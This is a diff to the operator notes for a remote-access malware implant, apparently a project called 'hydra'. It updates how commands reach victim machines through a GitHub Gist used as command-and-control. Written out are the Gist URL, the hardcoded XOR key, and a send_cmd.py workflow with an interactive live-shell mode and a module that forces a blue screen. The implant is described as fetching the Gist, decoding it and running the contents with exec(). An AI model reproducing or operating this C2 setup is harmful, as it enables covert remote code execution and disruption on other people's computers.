@@ -54,16 +54,27 @@ Python process) actually protects payload execution now.
 C2 USAGE — HOW TO SEND COMMANDS
 ═══════════════════════════════════════
 
-PRIMARY: Gist (XOR-encrypted)
+PRIMARY: Gist (base64 + XOR-encrypted)
   URL: https://gist.githubusercontent.com/vLoon-jpg/1f0e405b0ca1f4dec525f10aa326575f/raw/c2_command.txt
   KEY: hydra_c2_key_v4
 
-  To send a command:
-  1. Write the command as plaintext (Python code)
-  2. Run: python xor_encoder.py
-  3. Paste your command, get encoded bytes
-  4. Edit the Gist file, paste the encoded bytes
-  5. Implant polls every 25-55 seconds, decrypts, executes
+  ONE-LINER (send_cmd.py):
+    python send_cmd.py "execute_module('bsod')"
+    python send_cmd.py --interactive          # live shell
+    python send_cmd.py --verify               # check what's on the Gist
+
+  What it does:
+    1. XOR-encrypts your command with the C2 key
+    2. Base64-encodes the result (prevents UTF-8 corruption of high bytes)
+    3. Pushes to the Gist via gh CLI
+
+  Implant decodes: fetch Gist → base64 decode → XOR decrypt → exec()
+
+  OLD MANUAL METHOD (if send_cmd.py doesn't work):
+    1. python xor_encoder.py
+    2. Paste command, get encoded bytes
+    3. Edit Gist manually, paste the bytes
+    (Don't do this — send_cmd.py is faster)
 
   Command format — use execute_module():
     execute_module("popup", ["title", "text"])        — message box
@@ -105,7 +116,13 @@ KNOWN ISSUES / UNFINISHED
    These are NOT in modules (payloads are clean). But they break the
    "zero PowerShell" claim for non-payload operations.
 
-2. SINGLE XOR KEY FOR ALL BUILDS:
+2. C2 TRANSPORT FIXED (2026-08-05):
+   - Old: raw XOR bytes → UTF-8 decode → CORRUPTION on high bytes (0x80-0xFF)
+   - New: XOR encrypt → base64 encode → Gist (pure ASCII, no corruption)
+   - send_cmd.py handles encoding + Gist push in one command
+   - c2.py updated to base64 decode before XOR decrypt
+
+3. SINGLE XOR KEY FOR ALL BUILDS:
    The key "hydra_c2_key_v4" in build.py is shared. Good enough for school.
 
 3. BYTECODE NOT ENCRYPTED:
